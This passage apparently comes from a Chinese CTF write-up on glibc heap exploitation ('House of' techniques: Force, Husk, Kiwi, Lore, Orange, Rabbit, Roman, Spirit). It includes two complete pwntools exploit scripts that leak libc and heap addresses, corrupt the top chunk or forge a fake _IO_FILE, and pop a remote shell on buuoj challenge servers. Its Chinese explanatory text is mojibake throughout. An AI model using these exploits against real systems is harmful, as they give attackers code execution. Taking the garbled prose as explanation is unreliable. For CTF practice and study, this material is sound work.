class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>p_name = <span class="hljs-string">&#x27;./gyctf_2020_force&#x27;</span><br>p = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">25534</span>)<span class="hljs-comment">#process(p_name)#</span><br>e = ELF(p_name)<br>libc = ELF(<span class="hljs-string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.23.so&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">size:<span class="hljs-built_in">int</span>, content</span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;2:puts&quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;size&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;bin addr &quot;</span>)<br>    chunk_addr = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop = <span class="hljs-literal">True</span>), <span class="hljs-number">16</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;content&quot;</span>)<br>    p.send(content)<br>    <span class="hljs-keyword">return</span> chunk_addr<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    libc_leak = new(<span class="hljs-number">0x2000000</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>)<br>    libc_base = libc_leak - <span class="hljs-number">0x10</span> + <span class="hljs-number">0x2000000</span> + <span class="hljs-number">0x1000</span> <span class="hljs-comment"># chunk header</span><br>    log.success(<span class="hljs-string">&#x27;libc base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>    heap_leak = new(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span> * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xfffffffffffffff1</span>))<br>    top_chunk = heap_leak + <span class="hljs-number">0x10</span><br>    log.success(<span class="hljs-string">&#x27;top chunk: &#x27;</span> + <span class="hljs-built_in">hex</span>(top_chunk))<br><br>    new(libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] - top_chunk - <span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>)<br>    new(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span> + p64(libc_base + <span class="hljs-number">0x4526a</span>) + p64(libc_base + libc.sym[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>] + <span class="hljs-number">0x10</span>))<br>    p.recvuntil(<span class="hljs-string">b&quot;2:puts&quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;size&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x10</span>).encode())<br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/05/03/hG4lYofbJRq7aKr.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="House-of-Husk-å£³å±‚ã®ä»“"><a href="#House-of-Husk-å£³å±‚ã®ä»“" class="headerlink" title="House of Husk - å£³å±‚ã®ä»“"></a>House of Husk - å£³å±‚ã®ä»“</h2><p>ä¸»è¦æ˜¯åˆ©ç”¨ printf ç³»å‡½æ•°çš„è°ƒç”¨é“¾</p>
<p>å¤§æ¦‚æµç¨‹ï¼š</p>
<ol>
<li>æ³„éœ² libc åœ°å€</li>
<li>unsortedbin attack æŠŠ global_max_fast å˜å¤§</li>
<li>ç”¨ç›¸å¯¹è¦†å†™æŠŠ fake arginfo table åœ°å€å†™åˆ° __printf_arginfo_table</li>
<li>ç”¨ç›¸å¯¹è¦†å†™æŠŠ __printf_function_table å†™ä¸º NULL</li>
<li>è°ƒç”¨å¸¦æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ printf</li>
</ol>
<h3 id="ä¾‹é¢˜ï¼šCCISC2020-åä¸œåŒ—èµ›åŒº-Pwn5"><a href="#ä¾‹é¢˜ï¼šCCISC2020-åä¸œåŒ—èµ›åŒº-Pwn5" class="headerlink" title="ä¾‹é¢˜ï¼šCCISC2020-åä¸œåŒ—èµ›åŒº-Pwn5"></a>ä¾‹é¢˜ï¼šCCISC2020-åä¸œåŒ—èµ›åŒº-Pwn5</h3><h2 id="House-of-Kiwi-é£é¸Ÿã®ç¬¼å¼‚æœã®ç¯®"><a href="#House-of-Kiwi-é£é¸Ÿã®ç¬¼å¼‚æœã®ç¯®" class="headerlink" title="House of Kiwi - é£é¸Ÿã®ç¬¼å¼‚æœã®ç¯®"></a>House of Kiwi - <del>é£é¸Ÿã®ç¬¼</del>å¼‚æœã®ç¯®</h2><blockquote>
<p>Kiwi æ˜¯è¿™åªğŸ¦ğŸ¦„ï¼Ÿï¼ˆx</p>
<p><img src="https://bkimg.cdn.bcebos.com/pic/fcfaaf51f3deb48fdf81ac65f71f3a292cf578a4?x-bce-process=image/watermark,image_d2F0ZXIvYmFpa2U4MA==,g_7,xp_5,yp_5/format,f_auto" srcset="/img/loading.gif" lazyload alt="img.png"></p>
<p>nopeï¼Œæ˜¯<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/235598"> ğŸ¥ </a></p>
<p><img src="https://p3.ssl.qhimg.com/t016933e48a0f026951.jpg" srcset="/img/loading.gif" lazyload alt="image.png"></p>
</blockquote>
<p>House of  ğŸ¥ ä¸ºå¯¹ <code>_IO_file_jumps</code>ä¸­çš„syncæŒ‡é’ˆçš„ğŸ¥çš„åŠ«æŒï¼Œç®—æ˜¯æ¯”è¾ƒåé—¨çš„ä¸€ä¸ªğŸ¥ï¼Œåœ¨ <code>exit()</code> å‡½æ•°è¢«æ¢ä¸º <code>_exit()</code> æˆ–æ˜¯å…¶ä»–æ— æ³•è°ƒç”¨åˆ° <code>_IO_cleanup()</code> æ—¶çš„ä¸€ç§ç‰¹æ®Šçš„  FSOP æ‰‹æ®µ</p>
<p>ä¸»è¦ğŸ¥æ€è·¯æ˜¯é€šè¿‡è§¦å‘ <code>__malloc_assert()</code>  è°ƒç”¨ <code>_IO_file_jumps</code> ä¸­çš„ sync ğŸ¥æŒ‡é’ˆ</p>
<h3 id="ä¾‹é¢˜ï¼š-NepCTF2021-NULL-FxCK"><a href="#ä¾‹é¢˜ï¼š-NepCTF2021-NULL-FxCK" class="headerlink" title="ä¾‹é¢˜ï¼š  NepCTF2021 NULL_FxCK"></a>ä¾‹é¢˜ï¼š  NepCTF2021 NULL_FxCK</h3><h2 id="House-of-Lore-ä¼ è¯´ã®å±‹"><a href="#House-of-Lore-ä¼ è¯´ã®å±‹" class="headerlink" title="House of Lore - ä¼ è¯´ã®å±‹"></a>House of Lore - ä¼ è¯´ã®å±‹</h2><p>small bin attackï¼Œéœ€è¦æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶ small bin æœ€åä¸€ä¸ª chunk çš„ bk æŒ‡é’ˆ</p>
<h3 id="ä¾‹é¢˜ï¼š-1"><a href="#ä¾‹é¢˜ï¼š-1" class="headerlink" title="ä¾‹é¢˜ï¼š"></a>ä¾‹é¢˜ï¼š</h3><h2 id="House-of-Orange-æ–°æ©™ã®å®¤"><a href="#House-of-Orange-æ–°æ©™ã®å®¤" class="headerlink" title="House of Orange - æ–°æ©™ã®å®¤"></a>House of Orange - æ–°æ©™ã®å®¤</h2><p>House of Orange æ˜¯ä¸€ç§è¾ƒä¸ºç‰¹æ®Šçš„ğŸŠåˆ©ç”¨æ–¹å¼ï¼Œä¸»è¦é’ˆå¯¹äº<strong>æ²¡æœ‰ free çš„ç‰¹æ®Šåœºæ™¯</strong>ï¼Œåœ¨æ— æ³•ä½¿ç”¨ free() é‡Šæ”¾å †å—çš„ç‰¹æ®Šæƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éœ€è¦é€š<strong>è¿‡å¯¹æ¼æ´çš„åˆ©ç”¨ä»¥å®Œæˆ free çš„æ•ˆæœ</strong></p>
<p>é€šå¸¸æƒ…å†µä¸‹ï¼ŒğŸŠé€‰æ‹©åŠ«æŒ top chunkï¼šå½“ top chunk çš„ size ä¸è¶³ä»¥æ»¡è¶³éœ€æ±‚æ—¶ï¼ŒåŸæœ‰çš„ top chunk <strong>ä¼šè¢«é‡Šæ”¾ï¼Œæ”¾å…¥ unsorted bin ä¸­</strong>ï¼Œéšå ptmalloc2 é€šè¿‡ brk ç³»ç»Ÿè°ƒç”¨æ‰©å±•å †åŒºï¼Œæ­¤æ—¶æˆ‘ä»¬ä¾¿è·å¾—äº†ä¸€ä¸ª unsorted bin chunk</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬æ‰€è¯·æ±‚çš„ size ä¸èƒ½å¤Ÿå¤§äº <code>mmp_.mmap_threshold </code>ï¼ˆé€šå¸¸ä¸º 128kï¼‰ï¼Œå¦åˆ™ ptmalloc2 å°†ä¼šç›´æ¥é‡‡ç”¨ mmap ç³»ç»Ÿè°ƒç”¨åˆ†é…å†…å­˜</p>
<p>æˆ‘ä»¬è¿˜éœ€è¦ç»•è¿‡å¦‚ä¸‹æ£€æµ‹ï¼š</p>
<ul>
<li>Top chunk éœ€è¦å¯¹å†…å­˜é¡µï¼ˆé€šå¸¸æ˜¯0x1000ï¼‰å¯¹é½</li>
<li>size éœ€è¦å¤§äº MINSIZE è€Œå°äº request + MINSIZE</li>
<li>PREV_INUSE ä½éœ€ä¸º 1</li>
</ul>
<p>æ¥ä¸‹æ¥ä¾¿æ˜¯ House of Orange è¿™ä¸ªğŸŠä¸­æœ€ä¸ºç²¾é«“çš„ğŸŠï¼šé€šè¿‡ malloc è§¦å‘é”™è¯¯è¿™æ¡è·¯å¾„æ¥ä»¥ FSOP çš„æ–¹å¼ get shell</p>
<p>é€šè¿‡å †æº¢å‡ºæˆ–æ˜¯å…¶ä»–æ–¹å¼å°† unsorted bin çš„ bk æŒ‡é’ˆæ”¹ä¸º <code>_IO_list_all - 0x10</code>çš„åœ°å€ï¼Œsize æ”¹ä¸º 0x61ï¼Œå¹¶åœ¨å…¶ä¸­ä¼ªé€ æˆ‘ä»¬çš„ fake _IO_file_plus ç»“æ„ä½“</p>
<p>éšåè¿›è¡Œä¸€ä¸ªå¤§äºç°æœ‰ unsorted bin é“¾è¡¨å°¾ç»“ç‚¹çš„è¯·æ±‚ï¼ˆå‡è®¾ unsorted bin ä¸­åªæœ‰ä¸€ä¸ª chunkï¼‰ï¼Œæ­¤æ—¶è¯¥ chunk <strong>ä¾¿ä¼šè¢«æ”¾å…¥ small bin ä¸­</strong></p>
<p>æ¥ä¸‹æ¥ä¼šå‘ è¯¥ chunk çš„ bk æˆå‘˜â€”â€”  <code>_IO_list_all - 0x10</code> çš„ fd æŒ‡é’ˆâ€”â€”<strong>å³ _IO_list_all</strong> ä¸Šå†™å…¥ <code>main_arena + 0x58</code> çš„åœ°å€ï¼Œå¹¶åˆ¤æ–­è¯¥ â€œchunkâ€ æ˜¯å¦ç¬¦åˆè¦æ±‚â€”â€”è¿™ä¸ªæ—¶å€™ä¾¿ä¼šæŠ¥é”™ï¼Œé€šè¿‡ malloc_printerr æœ€ç»ˆèµ°åˆ° abort</p>
<p>abort åä¼šè°ƒç”¨ <code>_IO_flush_all_lockp()</code> å‡½æ•°ï¼Œå…ˆå¯¹<code>_IO_list_all</code>â€”â€” <code>main_arena + 0x58</code> è¿›è¡Œåˆ¤æ–­â€”â€”ä¸ç¬¦åˆè¦æ±‚ï¼Œæ­¤æ—¶ä¾¿ä¼šä»å…¶ <code>_chain</code> æŒ‡é’ˆå–å‡º<strong>ä¸‹ä¸€ä¸ª_IO_file_plus</strong>ç»“æ„ï¼Œè€Œè¯¥æŒ‡é’ˆä½äº _IO_file_plusç»“æ„åç§» <code>0x68</code> çš„åœ°æ–¹â€”â€”å³ä» <strong>main_arena + 0x58 + 0x68</strong> è¿™ä¸ªä½ç½®å–å‡ºä¸‹ä¸€ä¸ª _IO_file_plus ç»“æ„ä½“ï¼Œ<strong>åˆšå¥½æ˜¯ small bin ä¸­ size ä¸º 0x60 çš„åœ°æ–¹</strong>ï¼Œç”±æ­¤å®Œæˆæˆ‘ä»¬çš„ FSOP</p>
<h3 id="ä¾‹é¢˜ï¼šhouseoforange-hitcon-2016-House-of-Orange"><a href="#ä¾‹é¢˜ï¼šhouseoforange-hitcon-2016-House-of-Orange" class="headerlink" title="ä¾‹é¢˜ï¼šhouseoforange_hitcon_2016 - House of Orange"></a>ä¾‹é¢˜ï¼šhouseoforange_hitcon_2016 - House of Orange</h3><p>æƒ³éƒ½ä¸ç”¨æƒ³è‚¯å®šäº‹ä¿æŠ¤å…¨å¼€</p>
<p><img src="https://i.loli.net/2021/05/10/aQHisnOz1tXlCMY.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æï¼Œå¤§æ¦‚æœ‰ç€åˆ†é…ã€æ‰“å°ã€ç¼–è¾‘å †å—çš„åŠŸèƒ½ï¼Œ<strong>æ²¡æœ‰é‡Šæ”¾çš„åŠŸèƒ½</strong></p>
<p>åªèƒ½åˆ†é…ä¸‰æ¬¡</p>
<p><img src="https://i.loli.net/2021/05/10/6KJBQ7vXUPLcF3C.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ¼æ´ç‚¹åœ¨äºç¼–è¾‘å †å—çš„æ—¶å€™éªŒè¯ä¸ä¸¥å¯†ï¼Œå­˜åœ¨å †æº¢å‡º</p>
<p><img src="https://i.loli.net/2021/05/10/1YseHJxnPOZQc4K.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ç”±äºæ²¡æœ‰ free() å‡½æ•°ï¼Œè€ƒè™‘é€šè¿‡å †æº¢å‡ºä¿®æ”¹ top chunk çš„ size åå†è¡Œåˆ†é…è§¦å‘ brk ç³»ç»Ÿè°ƒç”¨æ‰©å±•å †åŒºå°†åŸæœ‰ top chunk é€å…¥ unsorted bin åå†åˆ†é…å›æ¥ï¼Œé€šè¿‡ bk æŒ‡é’ˆæ³„éœ² libc åŸºå€</p>
<p>æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œåœ¨åˆ†é…æ—¶è‹¥æ˜¯ small bin å’Œ large bin éƒ½æ˜¯ç©ºçš„æ—¶å€™ï¼Œptmalloc2 ä¼šå°† unsorted bin ä¸­æ‰€æœ‰ chunk æ”¾å…¥ å¯¹åº” bin ä¸­ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ†é… large bin ä»¥ç”±å…¶ fd_nextsize æŒ‡é’ˆæ³„éœ²å †åŸºå€</p>
<p>éšååœ¨ unsorted bin ä¸­ä¼ªé€  _IO_file_plus ç»“æ„ä½“ï¼Œé€šè¿‡ House of Orange çš„æ‰‹æ³•è¿›è¡Œ FSOP ä»¥ get shell</p>
<p>æ¯”è¾ƒå‘çš„ä¸€ä¸ªç‚¹å¤§æ¦‚æ˜¯æœ¬åœ°å’Œè¿œç¨‹åç§»å¥½åƒæœ‰äº›å°ä¸ä¸€æ ·â€¦â€¦ï¼Ÿåé¢æ‡’å¾—å»ç®—åç§»äº†ç›´æ¥å¤§é¢ç§¯æ’å°±å®Œäº‹äº†</p>
<p>exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>p_name = <span class="hljs-string">&#x27;./houseoforange_hitcon_2016&#x27;</span><br>p = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="hljs-number">27323</span>)<span class="hljs-comment">#process(p_name)#</span><br>e = ELF(p_name)<br>libc = ELF(<span class="hljs-string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.23.so&#x27;</span>)<span class="hljs-comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">command:<span class="hljs-built_in">int</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice : &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(command).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">size:<span class="hljs-built_in">int</span>, content, price:<span class="hljs-built_in">int</span>, color:<span class="hljs-built_in">int</span></span>):<br>    cmd(<span class="hljs-number">1</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Length of name :&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;Name :&quot;</span>)<br>    p.send(content)<br>    p.recvuntil(<span class="hljs-string">b&quot;Price of Orange:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(price).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;Color of Orange:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(color).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>():<br>    cmd(<span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">size:<span class="hljs-built_in">int</span>, content, price:<span class="hljs-built_in">int</span>, color:<span class="hljs-built_in">int</span></span>):<br>    cmd(<span class="hljs-number">3</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Length of name :&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;Name:&quot;</span>)<br>    p.send(content)<br>    p.recvuntil(<span class="hljs-string">b&quot;Price of Orange: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(price).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;Color of Orange: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(color).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    new(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>, <span class="hljs-number">114514</span>, <span class="hljs-number">0xddaa</span>)<br>    edit(<span class="hljs-number">0x1000</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span> * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span> * <span class="hljs-number">2</span>  + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xfa1</span>), <span class="hljs-number">114514</span>, <span class="hljs-number">0xddaa</span>)<br>    new(<span class="hljs-number">0x1000</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>, <span class="hljs-number">114514</span>, <span class="hljs-number">0xddaa</span>)<br>    new(<span class="hljs-number">0x400</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>, <span class="hljs-number">114514</span>, <span class="hljs-number">0xddaa</span>)<br>    dump()<br>    main_arena = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x668</span><br>    __malloc_hook = main_arena - <span class="hljs-number">0x10</span><br>    libc_base = __malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>    log.success(<span class="hljs-string">&#x27;libc base leak: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>    edit(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span> * <span class="hljs-number">2</span>, <span class="hljs-number">114514</span>, <span class="hljs-number">0xddaa</span>)<br>    dump()<br>    p.recvuntil(<span class="hljs-string">b&#x27;arttnba3&#x27;</span> * <span class="hljs-number">2</span>)<br>    heap_leak = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    heap_base = heap_leak &amp; <span class="hljs-number">0xfffffffff000</span><br>    log.success(<span class="hljs-string">&#x27;heap base leak: &#x27;</span> + <span class="hljs-built_in">hex</span>(heap_base))<br><br>    fake_file = <span class="hljs-string">b&quot;&quot;</span><br>    fake_file += <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span> <span class="hljs-comment"># _flags, an magic number</span><br>    fake_file += p64(<span class="hljs-number">0x61</span>) <span class="hljs-comment"># _IO_read_ptr, chunk size, got it into proper small bin</span><br>    fake_file += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># _IO_read_end</span><br>    fake_file += p64(libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>] - <span class="hljs-number">0x10</span>)<span class="hljs-comment"># _IO_read_base</span><br>    fake_file += p64(<span class="hljs-number">0</span>)<span class="hljs-comment"># _IO_write_base</span><br>    fake_file += p64(libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])<span class="hljs-comment"># _IO_write_ptr</span><br>    fake_file += p64(<span class="hljs-number">0</span>)<span class="hljs-comment"># _IO_write_end</span><br>    fake_file += p64(<span class="hljs-number">0</span>)<span class="hljs-comment"># _IO_buf_base;</span><br>    fake_file += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># _IO_buf_end should usually be (_IO_buf_base + 1)</span><br>    fake_file += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> <span class="hljs-comment"># from _IO_save_base to _markers</span><br>    fake_file += p64(libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]) <span class="hljs-comment"># the FILE chain ptr</span><br>    fake_file += p32(<span class="hljs-number">2</span>) <span class="hljs-comment"># _fileno for stderr is 2</span><br>    fake_file += p32(<span class="hljs-number">0</span>) <span class="hljs-comment"># _flags2, usually 0</span><br>    fake_file += p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>) <span class="hljs-comment"># _old_offset, -1</span><br>    fake_file += p16(<span class="hljs-number">0</span>) <span class="hljs-comment"># _cur_column</span><br>    fake_file += <span class="hljs-string">b&quot;\x00&quot;</span> <span class="hljs-comment"># _vtable_offset</span><br>    fake_file += <span class="hljs-string">b&quot;\n&quot;</span> <span class="hljs-comment"># _shortbuf[1]</span><br>    fake_file += p32(<span class="hljs-number">0</span>) <span class="hljs-comment"># padding</span><br>    fake_file += p64(libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="hljs-number">0x1ea0</span>) <span class="hljs-comment"># _IO_stdfile_1_lock</span><br>    fake_file += p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>) <span class="hljs-comment"># _offset, -1</span><br>    fake_file += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># _codecvt, usually 0</span><br>    fake_file += p64(libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>] - <span class="hljs-number">0x160</span>) <span class="hljs-comment"># _IO_wide_data_1</span><br>    fake_file += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> <span class="hljs-comment"># from _freeres_list to __pad5</span><br>    fake_file += p32(<span class="hljs-number">0xFFFFFFFF</span>) <span class="hljs-comment"># _mode, usually -1</span><br>    fake_file += <span class="hljs-string">b&quot;\x00&quot;</span> * <span class="hljs-number">19</span> <span class="hljs-comment"># _unused2</span><br>    fake_file = fake_file.ljust(<span class="hljs-number">0xD8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>) <span class="hljs-comment"># adjust to vtable</span><br>    fake_file += p64(heap_base + <span class="hljs-number">0x600</span>) <span class="hljs-comment"># fake vtable`</span><br>    fake_file += <span class="hljs-number">20</span> * p64(libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])<br><br>    edit(<span class="hljs-number">0x1000</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x400</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span> * <span class="hljs-number">2</span> + fake_file, <span class="hljs-number">114514</span>, <span class="hljs-number">0xddaa</span>)<br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    cmd(<span class="hljs-number">1</span>)<br><br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/05/11/q5paW1fs7Tvl8yg.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="House-of-Rabbit-å…”å­ã®çª"><a href="#House-of-Rabbit-å…”å­ã®çª" class="headerlink" title="House of Rabbit - å…”å­ã®çª"></a>House of Rabbit - å…”å­ã®çª</h2><p>åœ¨ malloc æ—¶å¯¹äº fastbin ä¸­çš„ chunk å­˜åœ¨ç€ size æ£€æŸ¥ï¼Œä½†æ˜¯åœ¨ malloc_consolidate() å‡½æ•°è¿‡ç¨‹ä¸­å¹¶ä¸ä¼šå¯¹ fastbin chunk çš„ size è¿›è¡Œæ£€æŸ¥ï¼Œç”±æ­¤æ„é€  overlapping</p>
<h3 id="ä¾‹é¢˜ï¼šHITB-GSEC-XCTF-2018-mutepig"><a href="#ä¾‹é¢˜ï¼šHITB-GSEC-XCTF-2018-mutepig" class="headerlink" title="ä¾‹é¢˜ï¼šHITB-GSEC-XCTF 2018 mutepig"></a>ä¾‹é¢˜ï¼šHITB-GSEC-XCTF 2018 mutepig</h3><h2 id="House-of-Roman-ç½—é©¬ã®å®¶"><a href="#House-of-Roman-ç½—é©¬ã®å®¶" class="headerlink" title="House of Roman - ç½—é©¬ã®å®¶"></a>House of Roman - ç½—é©¬ã®å®¶</h2><p>fastbin attack + unsorted bin attack</p>
<h3 id="ä¾‹é¢˜ï¼š-npuctf-2020-bad-guy"><a href="#ä¾‹é¢˜ï¼š-npuctf-2020-bad-guy" class="headerlink" title="ä¾‹é¢˜ï¼š npuctf_2020_bad_guy"></a>ä¾‹é¢˜ï¼š npuctf_2020_bad_guy</h3><h2 id="House-of-Spirit-ç²¾ç¥ã®é™¢"><a href="#House-of-Spirit-ç²¾ç¥ã®é™¢" class="headerlink" title="House of Spirit - ç²¾ç¥ã®é™¢"></a>House of Spirit - ç²¾ç¥ã®é™¢</h2><p>åœ¨ä¸å¯æ§åŒºåŸŸä¼ªé€  fake chunk ä»¥è¾¾åˆ°å¯æ§</p>
